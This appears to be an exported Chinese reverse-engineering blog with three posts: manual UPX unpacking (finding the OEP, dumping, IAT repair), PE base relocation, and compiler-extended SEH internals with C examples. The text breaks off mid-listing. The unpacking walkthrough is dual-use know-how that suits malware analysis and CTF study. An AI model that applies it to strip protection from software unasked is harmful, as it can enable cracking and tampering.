使用ESP定律追踪OEP的常见步骤：　　1、将待脱壳程序载入到OD中，开始就按键盘上的“F8”键单步跟踪一步，这时如果看到OD右边的寄存器窗口中的ESP寄存器的值有没有变为红色，如果发现ESP寄存器的值变为红色，执行第2步；　　2、在OD的命令行窗口中执行命令hrXXXXXXXX,xxxxxxxx就是变为红色的ESP寄存器的值，在输入命令之后，一定不要忘记按键盘上的回车键；　　3、按键盘上的“F9”键让程序运行起来；　　4、使用单步跟踪的方法跟踪到OEP即可。\n\n1.用x32dbg打开加壳程序，将会暂停在pushad指令处\n\n2.单步运行一次，此时8大寄存器只有esp发生了改变（只有esp为红色），此时右键esp，并选择在内存窗口中跟随\n\n3.此时内存窗口就会转到esp所指的地址，选中前四字节，然后右键-&gt;断点-&gt;硬件访问-&gt;4字节(D)来设置硬件断点\n\n4.设置完硬件断点后，直接运行，断点将会停在跳转oep的指令附近，就看到了popad指令，这也是马上到oep的标志，继续单步运行，发现有个jmp指令（10154BB），但是此时没有向上或向下的箭头，这是因为这是一个大跳转，而这个大跳转的地址就极大可能是oep地址（如下图中的100739D）\n\n5.继续单步运行，程序就会跳转到100739D地址处，此处便是oep，可以看和前面未加壳的oep一致\n\n二次断点法（内存镜像法）二次断点是有技巧的下两个断点，在两个断点之后就可以很轻松的找到OEP。\n（ 不是每个都可以的，一些像UPX和ASPACK就不行。）\n壳如果要把原来加密或压缩的代码运行起来就必须要解压和解密原来的代码。这一个过程可以将他看做是对代码段（code段）的写入，一个EXE文件的有code段，data段，rsrc段…..依次排列在你的内存空间中，只要你在data断或者rsrc段下内存访问断点，那么中断的时候code段就已经解压完毕了。这时我们再对code段下内存访问断点，不就可以到达OEP了吗？ 1.对data段下内存访问断点而中断是因为内存写入中断，目的是断在对对data段的解压时，这时壳要对data段写数据，但是code段已经解压 完毕。\n2.对code段下内存访问断点而中断是因为内存执行中断，目的当然就是寻找OEP了\n123456　　使用二次断点法追踪OEP的常见步骤：　　1、将待脱壳程序载入到OD中，单击OD的“选项”菜单下的“调试设置”命令，在弹出的“调试选项”对话框中切换到“异常”选项卡，勾选该选项卡下的所有复选框，也就是忽略所有异常；　　2、按键盘上的“ALT+M”组合键打开OD的内存窗口；　　3、在OD的内存窗口中找到“.rsrc”区段，单击该区段后按键盘上的“F2”键在该区段上下一断点；　　4、按“Shift+F9”让程序运行到断点心处，而后再次打开OD的内存窗口，这次在“.rsrc”区段上面的“.code”区段（有的时候就是“.text”）上下一个断点；　　5、按“shift+F9”让程序运行到第二次下的断点处，然后单步跟踪既可以来到OEP。\n\n首先设置忽略所有异常\n\n然后在内存窗口找到资源段（data段&#x2F;rsrc段）下断点，按“Shift+F9”让程序运行到断点处\n\n接着在内存窗口“.code”区段（有的时候就是“.text”）上下一个断点，按“Shift+F9”让程序运行到断点处，然后单步跟踪既可以来到OEP。\n\nx32dbg结合自带的scylla进行脱壳与修复找到oep后，就可以用x32dbg结合自带的scylla插件进行脱壳和修复iat了，具体步骤如下：\n①首先打开scylla插件，并点击dump按钮保存脱壳后的程序\n\n②然后点击IAT Autosearch,遇到result of advanced…..直接点击是\n\n③若弹框iat found说明找到了程序的IAT表，点击确定\n\n④点击Get imports就会在上面显示找到的导入表\n\n如果有一个表没有导出成功，，如下图所示：\n\n直接右键删除这个导出失败的表，然后点击Fix Dump进行修复\n修复完后可以看到文件夹下多了两个程序，第二个是导出但没有修复IAT的程序，第三个是基于导出的源程序修复好了IAT。双击是可以直接运行的。\n\n使用lordpe+importREC脱壳及修复在od找到oep后，使用ollydump脱壳并用importREC修复后程序不能运行，用lordpe修复pe还是不能运行，此时可以选择不使用ollydump脱壳，而是用lordpe脱壳并用importREC，具体操作示例如下：\n1.使用od找到oep后，记录下oep地址，如下找到的oep地址是0100739D\n\n2.双击运行待脱壳程序，以管理员身份打开lordpe，并选择待脱壳程序右键选择完整转存，如下示例待脱壳程序是notepad_u…\n\n3.用lordpe dump文件后，以管理员身份打开importREC，选择待脱壳程序，本例中为notepad_upx.exe\n\n4.点击IAT AutoSearch，如果出现如下提示表示找到了IAT，点击确定即可\n\n5.若找到IAT，接着点击Get Imports获取输入表，如下图获取到了输入表，但是有个显示了?，且后面有valid：No，表示有无效输入表\n\n6.点击Show Invalid选择失效的输入表，右键选择Invalidate functions，然后再右键选择Trace Level1(Disasm)，接着再选择Show Invalid；若还有，则继续右键选择Trace Level2(Hook)，接着再选择Show Invalid；若还有，继续右键选择Trace Level3(Trap Flag)，接着再选择Show Invalid；若还有，则右键选择Delete thunk(s)删除无效的输入表，接着再选择Show Invalid，可以发现没有无效输入表了\n\n\n7.紧接着将oep修改为od中查找的oep，填偏移量即0000739D，然后选择Fix Dump按钮，再弹出文件框选择之前lordpe dump的文件\n\n8.修复成功后提示生成新的文件，文件名以_结尾，如本例中为notepad_upx_dumped_.exe，双击运行修复后的文件可以正常运行，用od打开修复后的文件发现直接是oep，已没有壳\n\n参考链接CTF中手工脱壳实例(UPX壳)\n脱壳后软件无法运行的原因分析及对策——写给初学者\n用importREC修复Import表\n逆向常用小工具（一）——importREC\n对于UPX壳的脱壳问题\nximo脱壳1—手脱UPX壳 \n脱壳入门初级教学 \n脱壳方法总汇\n逆向基础——软件手动脱壳技术入门\nhttps://www.cnblogs.com/LyShark/p/11190029.html\nhttps://yangtf.gitee.io/ctf-wiki/reverse/unpack/packer-introduction/\n普通壳的脱壳方法和脱壳技巧，叫新手少走弯路！\n","slug":"UPX脱壳实战——结合逆向工程核心原理","date":"2022-05-11T03:23:55.000Z","categories_index":"","tags_index":"逆向工程核心原理,加壳与脱壳,iat修复","author_index":"0netry"},{"id":"79cf73108f662b9d6b8f237086d2463b","title":"PE文件——基址重定位","content":"当链接器生成一个PE文件时，会假设这个文件在执行时被装载到默认的基地址处，并把code和data的相关地址都写入PE文件。如果载入时将默认的值作为基地址载入，则不需要重定位。但是，如果PE文件被装载到虚拟内存的另一个地址中，链接器登记的那个地址就是错误的，这时就需要用重定位表来调整。在PE文件中，重定位表往往单独作为一块，用”.reloc” 表示。\n基址重定位的概念PE格式不参考外部DLL或模块中的其他区块，而是把文件中所有可能需要修改的地址放在一个数组里。如果PE文件不在首选的地址载入，那么文件中的每一个定位都需要被修正。对加载器来说，它不需要知道关于地址使用的任何细节，只要知道有一系列的数据需要以某种一致的方式来修正就可以了。下面以实例DlIDemo.DLL为例讲述其重定位过程。如下代码中两个加粗的地址指针就是需要重定位的数据。\n\n分析一下0040100Eh处，其作用是将一个指针压入栈，00402000h是某一字符串的指针。这句指令有5字节长，第1个字节(68h)是指令的操作码，后4个字节用来保存一个DWORD大小的地址( 00402000h )。在这个例子中，指令来自一个基址为00400000h的DLL文件，因此这个字符串的RVA值是2000h。如果PE文件确实在00400000h处载入，指令就能够按照现在的样子正确执行。但是，当DLL执行时，Windows 加载器决定将其映射到00870000h处(映射基址由系统决定),加载器就会比较基址和实际的载入地址，计算出一个差值。在这个例子中，差值是470000h, 这个差值能被加载到DWORD大小的地址里以形成新地址。在前面的例子中，地址0040100Fh是指令中双字的定位，对它将有一个基址重定位，实际上字符串的新地址就是00872000h。为了让Windows有能力进行这样的调整，可执行文件中有多个”基址重定位数据”。本例中的Windows 加载器应把470000h加给00402000h，并将结果00872000h写回原处。这个过程如下图所示。\n\nDIlDemo.DLL在内存中进行重定位处理后的代码如下。\n\n对EXE文件来说，每个文件总是使用独立的虛拟地址空间，所以EXE总是能够按照这个地址载入，这意味着EXE文件不再需要重定位信息。对DLL来说，因为多个DLL文件使用宿主EXE文件的地址空间，不能保证载入地址没有被其他DLL使用，所以DLL文件中必须包含重定位信息，除非用一个&#x2F;FIXED开关来忽略它们。在Visual Studio .NET中，链接器会为Debug和Release模式的EXE文件省略基址重定位，因此，在不同系统中跟踪同一个DLL文件时，其虚拟地址是不同的，也就是说，在读者的机器里运行DlIDemo.DLL, Windows加载器映射的基址可能不是00870000h,而是其他地址。\n基址重定位表的结构基址重定位表( Base Relocation Table)位于一个.reloc 区块内，找到它们的正确方式是通过数据目录表的IMAGE_DIRECTORY_ENTRY_BASERELOC条目查找。基址重定位数据采用类似按页分割的方法组织，是由许多重定位块串接成的，每个块中存放4KB (1000h)的重定位信息，每个重定位数据块的大小必须以DWORD( 4字节)对齐。它们以一个IMAGE_BASE_RELOCATION结构开始，格式如下。\n\n\nVirtualAddress: 这组重定位数据的开始RVA地址。各重定位项的地址加这个值才是该重定位项的完整RVA地址。\nSizeOfBlock: 当前重定位结构的大小。因为VirtualAddress和SizeOfBlock的大小都是固定的4字节，所以这个值减8就是Typeoffset数组的大小。\nTypeffset: 一个数组。数组每项大小为2字节，共16位。这16位分为高4位和低12位。高4位代表重定位类型; 低12位是重定位地址，它与VirtualAddress相加就是指向PE映像中需要修改的地址数据的指针。\n\n常见的重定位类型如下所示。\n\n虽然有多种重定位类型，但对x86可执行文件来说，所有的基址重定位类型都是IMAGE_REL_BASED_HIGHLOW。在一组重定位结束的地方会出现一个类型是IMAGE_REL_BASED_ABSOLUTE的重定位，这些重定位什么都不做，只用于填充，以便下一个IMAGE_BASE_RELOCATION按4字节分界线对齐。所有重定位块以一个VirtualAddress 字段为0的IMAGE_BASE_RELOCATION结构结束。\n重定位表的结构如下图所示，它由数个IMAGE_BASE_RELOCATION结构组成，每个结构由VirtualAddress、SizeOfBlock 和TypeOffset 3部分组成。\n\n对于IA-64可执行文件，重定位类型似乎总是IMAGE_REL_BASED_DIR64。 就像x86重定位，也用IMAGE_REL_BASED_ABSOLUTE重定位类型进行填充。有趣的是，尽管IA-64的EXE页大小是8KB,但基址重定位仍是4KB的块。\n基址重定位表实例分析下面以DlIDemo.DLL为例来讲解。数据目录表指向重定位表的指针是00005000h,换算成文件偏移地址就是00000E00h。其中IMAGE_BASE_RELOCATION结构如图所示。\n\n\nVirtualAddress: 00 00 10 00。\n\nSizeOfBlock: 00 00 00 10 (有4个重定位数据，(10h -8h)&#x2F;2h&#x3D;4h )。\n➢重定位数据1: 30 0F。\n➢重定位数据2: 30 23。\n➢重定位数据3: 00 00 (用于对齐)。\n➢重定位数据4: 00 00 (用于对齐)。\n重定位数据计算过程如表11.15所示。\n\n\n\n用十六进制工具查看实例文件，其中60Fh和623h分别指向00402000h和00403030h处，如图11.25所示的阴影部分即为所需要重定位的数据。\n\n执行PE文件前，加载程序在进行重定位的时候，会用PE文件在内存中的实际映像地址减PE文件所要求的映像地址，根据重定位类型的不同将差值添加到相应的地址数据中。\n某次样本分析中基址重定位代码示例1234567891011121314151617181920212223242526272829303132333435363738BOOL __cdecl sub_2AC1F34(_IMAGE_NT_HEADERS **a1, int a2)&#123;  IMAGE_FILE_HEADER *v2; // ebx  _DWORD *v4; // ecx  int i; // eax  int v6; // edx  _WORD *v7; // esi  unsigned int v8; // edi  _IMAGE_NT_HEADERS *v9; // [esp+4h] [ebp-8h]  v2 = a1[1];  v9 = v2;  if ( !(*a1)-&gt;OptionalHeader.DataDirectory[5].Size )    return a2 == 0;  v4 = (&amp;v2-&gt;Machine + (*a1)-&gt;OptionalHeader.DataDirectory[5].VirtualAddress);  for ( i = *v4; *v4; i = *v4 )  &#123;    v6 = v4[1];    v7 = v4 + 2;    v8 = 0;    if ( ((v6 - 8) &amp; 0xFFFFFFFE) != 0 )    &#123;      do      &#123;        if ( (*v7 &amp; 0xF000) == 0x3000 )         // 判断Typeffset高四位是否为3，即类型IMAGE_REL_BASED_HIGHLOW                                                // 若是则进行基址重定位          *(&amp;v2-&gt;Machine + i + (*v7 &amp; 0xFFF)) += a2;        v6 = v4[1];        ++v8;        ++v7;      &#125;      while ( v8 &lt; (v6 - 8) &gt;&gt; 1 );      v2 = v9;    &#125;    v4 = (v4 + v6);  &#125;  return 1;&#125;\n\n","slug":"PE文件——基址重定位","date":"2022-05-03T14:33:53.000Z","categories_index":"","tags_index":"逆向,PE文件,基址重定位","author_index":"0netry"},{"id":"aa231c03641d31bfb6874bcdc873cd1e","title":"编译器扩展的SEH","content":"注：vc6++的异常处理函数为except_handler3，visual stdio的异常处理函数为except_handler4（具体见基于Visual Stdio2019的例子）\n编译器对SEH的支持首先来回顾一下，原先挂一个SEH到链表上的步骤是怎样的。\n\n再来看看编译器扩展SEH后是如何实现的，以Visual C++ 6.0为例\n\n可以看到，简化了非常多，关键字try形成了一个区块，只需要将可能出现异常的代码放入这个try块里，编译器会替我们将异常处理程序嵌入到SEH结构体中，并将其挂入局部SEH链表内。\n过滤表达式except使用过滤表达式来判断当前异常处理程序是否可以处理该异常。\n取值except里的过滤表达式，只能是以下3个值中的一个：\n\nEXCEPTION_EXECUTE_HANDLER(1)：执行except中的异常处理代码 。\nEXCEPTION_CONTINUE_SEARCH(0)：寻找下一个异常处理函数。\nEXCEPTION_CONTINUE_EXECUTION(-1)：返回至异常错误处并重新执行。\n\n形式过滤表达式有3种写法：\n\n直接写常量值：这个比较好理解，就是填过滤表达式取值中的一个。\n\n表达式：\n12345678910111213141516_try&#123;    _asm    &#123;        xor edx,edx        xor ecx,ecx        mov eax,10        idiv ecx\t\t//EDX = (EAX/ECX)取余    &#125;&#125;//如果异常码为0xC0000094返回1否则返回0_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)&#123;    printf(&quot;如果出现异常 此处处理\\n&quot;);&#125;\n\n表达式的写法相较于常量值，就是换了一种形式，它并没有做处理，但是多了逻辑判断。\n\n调用函数写法：\n12345678910111213141516171819202122232425262728//参数根据需要来写,可以不要参数int ExceptFilter(LPEXCEPTION_POINTERS pExceptionInfo)&#123;\tpExceptionInfo-&gt;ContextRecord-&gt;Ecx = 1;\t//异常处理\treturn EXCEPTION_CONTINUE_EXECUTION;\t//返回出错位置重新执行&#125;int main()&#123;\t_try\t&#123;\t\t_asm\t\t&#123;\t\t\txor edx,edx\t\t\txor ecx,ecx\t\t\tmov eax,10\t\t\tidiv ecx\t\t//EDX = (EAX/ECX)取余\t\t&#125;\t&#125;        \t//GetExceptionInformation获取异常结构指针\t_except(ExceptFilter(GetExceptionInformation()))\t&#123;\t\tprintf(&quot;如果出现异常 此处处理\\n&quot;);\t&#125;\t\tgetchar();&#125;\n\n调用函数的方式，过滤表达式的值其实就是异常处理函数的返回值，因此采用调用函数的方式，就相当于编写SEH的handler。那么问题来了，在采用调用函数的写法下，已经有异常处理函数了，那么except内部的处理会执行吗**？\n这要取决于异常处理函数的返回值了，也就是过滤表达式的取值。以上面的代码为例，由于返回值是EXCEPTION_CONTINUE_EXECUTION，所以异常处理函数执行完后，会回到异常处执行，这时由于修改了Ecx的值，因此再次执行时不会发生异常，也就不会再跳转到except处执行了。\n\n那么问题又来了，既然异常处理函数已经实现了功能，为什么还要有except区块呢？\n其实这里的关键在于GetExceptionInformation函数，调用它可以获取到异常结构的指针，从而获取到异常发生时记录的信息以及上下文环境，若没有异常处理函数，那么在except函数内部也可以调用GetExceptionInformation获取到相关的参数，从而对异常进行处理。同样，如果异常处理函数的返回值为EXCEPTION_CONTINUE_HANDLER，则会在异常函数处理完之后，跳转到except块中执行。大部分情况下，使用except块进行处理异常是足够的，它可以让3环程序员打印出必要的信息，起到调试的作用，并不会像异常处理函数那样，修改真正的寄存器的值，使得程序重新执行。也因此，大部分表达式的值，最终都是1，这样就直接进入except执行。\n\n\n_try_except实现细节手动挂入首先我们来回顾一下手动挂入链表的过程：\n\n由图，手动挂入链表需要自身SEH结构的地址赋值给FS:[0]的位置，这样相当于把自己挂到链表首位。当然，还需要将自己的next指针指向原先FS:[0]处所指向的地址，这里没有显示出。\n自动挂入以如下代码为例：\n12345678910111213141516171819#include &quot;stdafx.h&quot;#include void TestException()&#123;\t_try&#123;\t\t&#125;\t_except(1)&#123;\t\t&#125;&#125;int main(int argc, char* argv[])&#123;\tTestException();\t//下断点\t\tgetchar();\treturn 0;&#125;\n\n在TestException处下断点，观察反汇编。\n\n可以看到，**_try_except实际上的操作过程与手动挂入链表类似，同样是让FS:[0]指向新的链表头**。接下来，我们来看另一种场景。\n_try_except嵌套重复修改TestException如下：\n1234567891011121314151617181920212223242526void TestException()&#123;\t_try\t&#123;\t\t_try\t\t&#123;\t\t&#125;\t\t_except(1)\t\t&#123;\t\t\t&#125;\t&#125;\t_except(1)\t&#123;\t&#125;\t_try\t&#123;\t&#125;\t_except(1)\t&#123;\t&#125;&#125;\n\n编译，下断点，观察反汇编\n\n会神奇的发现，在try_except嵌套与重复的情况下（递归不包括，因为递归属于重复调用函数，会挂入多个SEH），经过编译器汇编后，仍然只有一个异常处理函数_except_handler3（该函数不同编译器不一样，此实验环境为VC6.0），并且只挂入了一次SEH。这是什么原因呢？\n原来编译器扩展了SEH结构体，在原先Windows要求下，SEH结构体至少要包含2个字段（Next：指向下一个SEH块，Handler：异常处理函数），其堆栈结构如下所示：\n\n但是经过扩展后的SEH结构体原型如下（稍后会分析该结构体）：\n1234567struct _EXCEPTION_REGISTRATION&#123;    struct _EXCEPTION_REGISTRATION *prev;    void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);    struct scopetable_entry *scopetable;    int trylevel;    int _ebp; &#125;;\n\n这样一来，堆栈的结构也就发生了变化，也就可以对应上之前分析的汇编代码。\n\n接下来，研究该结构体的额外字段的作用，便可了解编译器是如何通过只挂一个SEH实现所有嵌套重复try_except块的功能。\n扩展的_EXCEPTION_REGISTRATION结构体再来看_EXCEPTION_REGISTRATION这个结构：\n1234567struct _EXCEPTION_REGISTRATION&#123;    struct _EXCEPTION_REGISTRATION *prev;    void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);    struct scopetable_entry *scopetable;    int trylevel;    int _ebp; &#125;;\n\n它多出了3个成员，其中最为重要的是scopetable和trylevel这两个字段，先来看scopetable。\nScopeTablescopetable是一个指针，它指向一个结构体数组，结构体如下：\n123456struct scopetable_entry&#123;\tDWORD previousTryLevel\t\t//上一个try&#123;&#125;结构编号\t\t \tPDWRD lpfnFilter\t\t//过滤函数的起始地址\t\t\tPDWRD lpfnHandler\t\t//异常处理程序的地址\t   \t&#125;\n\n这三个成员的含义如何理解呢？根据注释，知道它是两个指针以及1个编号。下面用一个程序理清他们的作用。\n编译运行如下代码（环境VC++6.0），并在a函数调用处设下断点。\n123456789101112131415161718192021222324252627282930313233343536373839404142#include &quot;stdafx.h&quot;#include int ExceptionFilter()&#123;\treturn EXCEPTION_CONTINUE_EXECUTION;&#125;void a()&#123;\t_try\t&#123;\t\t//异常点A\t&#125;\t_except(EXCEPTION_EXECUTE_HANDLER)\t&#123;\t\tprintf(&quot;异常处理函数A\\n&quot;);\t&#125;\t_try\t&#123;\t\t//异常点B\t\t_try\t\t&#123;\t\t\t//异常点C\t\t\t&#125;\t\t_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)\t\t&#123;\t\t\t\tprintf(&quot;异常处理函数C \\n&quot;);\t\t&#125;\t&#125;\t_except(ExceptionFilter())\t&#123;\t\tprintf(&quot;异常处理函数B\\n&quot;);\t&#125;&#125;int main()&#123;\ta();&#125;\n\n\n进入反汇编，根据_EXCEPTION_REGISTRATION结构的位置，找到scopetable的值，并在内存中定位到scopetable指向的结构体数组地址，如下图所示：\n\n\n将数组中各结构体的成员标出后如下图：\n\n这样来看，lpfnFilter与lpfnHandler的作用就清晰了很多：\n\nlpfnFilter：指向except括号内的内容，在前一篇文章中提到过滤表达式，也就是except括号内常量值，这里编译器将其优化成了一段可以返回的代码（注意ret指令），所以当异常发生时，代码已经不是顺序执行的了，而是会经过多次跳转和返回。\nlpfnHandler：指向异常处理函数，这就相当于默认SEH结构的Handler的值。\n\n综上，可以看出，之所以经过编译器扩展后仅有一个SEH块，原因是编译器通过对SEH块进行扩展，将每一个try_except块对应的过滤表达式与异常处理函数放到了scopetable指向的结构体数组中。这样就能在一个SEH块中容纳下多个try_except。\n\n前面提到了scopetable中的两个指针成员lpfnFilter与lpfnHandler，还有一个成员previousTryLevel还未提。这个成员有什么用呢？再回顾一下，这3个try_except块对应的previousTryLevel的值\n\n结合之前的一张图，可以看出两个值为-1的previousTryLevel对应两个外层的try_except块，值为1的previousTryLevel则对应内嵌在第二个try_except中的try_except块。这样就能理解了，previousTryLevel指的是当前try_except块所在的外层try_except块的下标是多少。例如前两个try_except块，它们的外层已经没有try_except块了，因此值为-1。内嵌的try_except块，位于第二个try_except块中，这里说的第二个的意思就是在scopetable指向的结构体数组中位于第二个，也就是下标为1。因此内嵌的try_except的previousTryLevel的值为1。\n\n\nTryLevel理解了scopetable及其指向的结构体内的字段后，trylevel也就好理解了。它指的是当前代码执行到哪个try_except块了。如何理解呢？来看下面代码：\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &quot;stdafx.h&quot;#include int ExceptionFilter()&#123;\treturn 1;&#125;void a()&#123;\t_try\t&#123;\t\t_try\t\t&#123;\t\t\t\t&#125;\t\t_except(EXCEPTION_EXECUTE_HANDLER)\t\t&#123;\t\t\tprintf(&quot;异常处理函数\\n&quot;);\t\t&#125;\t&#125;\t_except(EXCEPTION_EXECUTE_HANDLER)\t&#123;\t\tprintf(&quot;异常处理函数\\n&quot;);\t&#125;\t_try\t&#123;\t\t_try\t\t&#123;\t\t\t\t\t&#125;\t\t_except(GetExceptionCode() == 0xC0000094 ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)\t\t&#123;\t\t\t\tprintf(&quot;异常处理函数\\n&quot;);\t\t&#125;\t&#125;\t_except(ExceptionFilter())\t&#123;\t\tprintf(&quot;异常处理函数\\n&quot;);\t&#125;&#125;int main()&#123;\ta();&#125;\n\n同样在调用函数a处下断点，并进入反汇编。\n\n可以看到，在初始化SEH结构体时，trylevel的值被设置为-1，位于[ebp-4]的位置。\n\n观察这几处trylevel值的变化，它在进入第一个try_except块时，被设置为0（该try_except块对应的结构体位于scopetable[0]），在进入第二个try_except块时，又被设置成了1，一旦离开第二个try_except块，回到第一个try_except块所在空间时，又被设置成了0，等到了离开第一个try_except块时，被设置成了-1。\n\n同样，在执行到另外几个try_except块时，trylevel也会被设置成该try_except块位于scopetable指向的结构体数组中的下标。所以可以看出，trylevel的作用，就是用来表明，当前程序位于哪个try_except块中，若不位于try_except块中，则设置为-1。\nebpebp就是ebp，可以认为是寻址用的，例如[ebp-4]就是trylevel的值。\n_except_handler3执行过程至此，已经基本上了解一个异常处理的完整流程，这里就简单的回顾一遍这个过程。这里以用户触发除零异常为例：\n\nCPU检测到异常\n查询IDT表，执行中断处理函数\nCommonDispatchException\nKiDispatchException\nKiDebugRoutine（判断内核调试器）\nDbgkForwardException（判断用户调试器）\nKiUserExceptionDispatcher\nRtlDispatchException（3环）\nVEH\nSEH\n执行_except_handler3函数\n根据trylevel选择scopetable数组中的结构体\n调用scopetable数组中对应结构体的lpfnFilter\nEXCEPTION_EXECUTE_HANDLER(1) 执行except代码\nEXCEPTION_CONTINUE_SEARCH(0) 寻找下一个\nEXCEPTION_CONTINUE_EXECUTION(-1) 重新执行\n\n\n如果lpfnFilter函数返回0，则向上遍历，直到previousTryLevel为-1\n\n\n\n_try_finally格式123456_try&#123;\t//可能出错的代码&#125;_finally&#123;\t//一定要执行的代码&#125;\n\n特点正如注释所示，try_finally块的特点就是在finally块里的代码一定会得到执行。\n\n观察上图，无论使用continue，break这样的控制语句，还是return这样的返回语句，亦或是触发异常，finally块内的语句始终会被执行。正如同前一篇分析讨论try_except的实现细节一样，本篇也将从反汇编的角度，分析try_finally的实现细节。\n局部展开函数——_local_unwind2scopetable以return为例，观察反汇编，看程序是如何在return执行语句的控制下，仍然执行了finally语句块的内容。\n123456789101112131415161718192021#include &quot;stdafx.h&quot;#include void test()&#123;\t_try&#123;\t\treturn;\t\tprintf(&quot;其它代码\\n&quot;);\t&#125;\t_finally&#123;\t\tprintf(&quot;一定会执行的代码\\n&quot;);\t&#125;&#125;int main()&#123;\ttest();\tgetchar();\treturn 0;&#125;\n\n在test()函数处下断点，编译并执行函数（环境Visual C++6.0）\n\n由图，根据scopetable指向的地址，会发现它指向的结构体与try_except时不太一样。因为try_finally没有过滤表达式，因此第二个成员的值是空的。再看第三个成员，指向finally块内程序的地址。这下我们就知道finally块内的语句从哪里可以找到。那么问题来了，编译器是如何保证在return掉程序之前，执行finally块内的语句的呢？\n_local_unwind2继续观察反汇编，注意到，在执行return语句之前，调用了一个名为_local_unwind2的函数。这里需要说明一点，为什么这个过程被称作局部展开，原因就是在于这个函数翻译成中文就是局部展开的意思，没有别的含义。这地方很容易产生误解，局部展开不是一种技术，就是一个函数名而已。\n进入_local_unwind2函数，继续分析\n\n注意最后一行，_local_unwind2调用了一个地址，单步到这条指令，根据寄存器内的值，可以很容易的算出，这个地址（看前一张图），刚好就是finally块内语句的地址。也就是说，local_unwind2函数的作用就是执行finally块内的语句。又因为这个local_unwind2会在return执行前被调用（break, continue, 异常同理），因此finally块内的语句一定会被执行。\n全局展开有局部，就会有全局，就像SEH与VEH一样。那什么是全局展开呢？查看下面一种情况：\n12345678910111213141516171819202122232425262728293031323334353637#include &quot;stdafx.h&quot;#include void test()&#123;\t_try\t&#123;\t\t_try\t\t&#123;\t\t\t_try\t\t\t&#123;\t\t\t\t*(int*)0 = 10;\t\t\t&#125;\t\t\t_finally\t\t\t&#123;\t\t\t\tprintf(&quot;一定会执行的代码A\\n&quot;);\t\t\t&#125;\t\t&#125;\t\t_finally\t\t&#123;\t\t\tprintf(&quot;一定会执行的代码B\\n&quot;);\t\t&#125;\t&#125;\t\t_except(1)\t&#123;\t\tprintf(&quot;异常处理函数\\n&quot;);\t&#125;&#125;int main()&#123;\ttest();\tgetchar();\treturn 0;&#125;\n\n在前面学习了并了解了try_except的本质后，以_except_handler3执行的角度来看这段代码：异常发生在最内层的try块中，此时except_handler3函数会根据当前trylevel的值找到对应的结构体并寻找异常处理函数，这时发现，结构体的第二个成员的值为空，说明这是一个finally块，不会处理异常，因此它将根据当前结构体的previousTryLevel的值，去找中间一层的try块对应的结构体。同样，在中间一层的try块中也没找到异常处理函数，这时它就会去最外层的try块中找，这时，找到了。\n按照之前了解的_except_handler3的执行流程，由于过滤表达式的值为1，因此会执行except内的代码，那么一旦执行完except的代码，程序将退出try块，那么问题来了，内层try块的语句，不就得不到执行了吗？\n\n可以看到，finally块内的语句都得到了执行，接下来，跟进汇编，看看编译器的如何做到的。在_except(1)处下断，运行程序：\n\n在执行完过滤表达式的语句后，可以单步到这里。发现，在这里调用了一个global_unwind2（全局展开）函数，并且接下来也调用了2次local_unwind2，这些都发生在执行except块的代码之前。这样就好理解了，当_except_handler3函数发现except内的过滤表达式值为1时，它会先执行global_unwind2，global_unwind2会从触发异常的那个try开始，依次调用局部展开，这样就可以保证finally块语句一定会得到执行。\n基于Visual Stdio 2019的例子前置知识咱们先看看增强版的数据结构，跟之前的原始版本有很多相似之处：\n12345678910typedef struct _EXCEPTION_REGISTRATION PEXCEPTION_REGISTRATION;struct _EXCEPTION_REGISTRATION&#123;   struct _EXCEPTION_REGISTRATION *prev;   void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);   struct scopetable_entry *scopetable;   int trylevel;   int _ebp;   PEXCEPTION_POINTERS xpointers;&#125;;\n\n这个 EXCEPTION_REGISTRATION 在增强版中就相当于原始版本中的 EXCEPTION_REGISTRATION_RECORD。可以这么理解它：\n1234567struct _EXCEPTION_REGISTRATION&#123;   struct _EXCEPTION_REGISTRATION_RECORD ExceptionRegistrationRecord;   struct scopetable_entry *scopetable;   int trylevel;   int _ebp;   PEXCEPTION_POINTERS xpointers;&#125;; // 注：本结构体只用于理解原始版和增强版的区别，实际代码中并没有这种形式的定义        \n\n也就是说它沿用了老版本的注册信息结构，只是在域成员名称上做了些改动，把 Next 改名为 prev，把 Handler 改为 handler。除此之外，在原始版本基础上增加了4个域成员（scopetable、trylevel、_ebp、xpointers），用来支持它的增强功能。\n需要说明的是，这结构体来源于 MSC 的 crt 源码里的 exsup.inc，这个文件使用的是汇编语法，该结构体定义是从该文件的注释中提取出来。在实际的分析过程中，发现它的定义有一些问题：最后一个域成员 xpointers 实际上存放在 prev 之前，也就是说，实际中 __try 增强版用的结构体是这样的：\n123456789typedef struct _EXCEPTION_REGISTRATION PEXCEPTION_REGISTRATION;struct _EXCEPTION_REGISTRATION&#123;   PEXCEPTION_POINTERS xpointers;   struct _EXCEPTION_REGISTRATION *prev;   void (*handler)(PEXCEPTION_RECORD, PEXCEPTION_REGISTRATION, PCONTEXT, PEXCEPTION_RECORD);   struct scopetable_entry *scopetable;   int trylevel;   int _ebp;&#125;; \n\nSEH scopetablescopetable指向了一个用于描述函数中所有__try代码块的数组。在SEH4中，scopetable是一个被加密过后的scopetable的地址（xor cookie）\nfilterfunc指向异常过滤函数（__except中的表达式），handlerfunc指向except代码块。\n如果filterdunc是NULL，那么Handlerfunc就指向__finally代码块。\n具体有多少个try，体现在trylevel中。\n1234567891011121314151617struct _EH4_SCOPETABLE &#123;        DWORD GSCookieOffset;        DWORD GSCookieXOROffset;        DWORD EHCookieOffset;        DWORD EHCookieXOROffset;        _EH4_SCOPETABLE_RECORD ScopeRecord[n];   //ScopeRecord数组&#125;;struct _EH4_SCOPETABLE_RECORD &#123;        DWORD EnclosingLevel;        long (*FilterFunc)();            union &#123;            void (*HandlerAddress)();            void (*FinallyFunc)();     &#125;;&#125;;\n\n源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546471\t#include &quot;stdio.h&quot;2\t#include &quot;windows.h&quot;3\t#include &quot;tchar.h&quot;45\tint 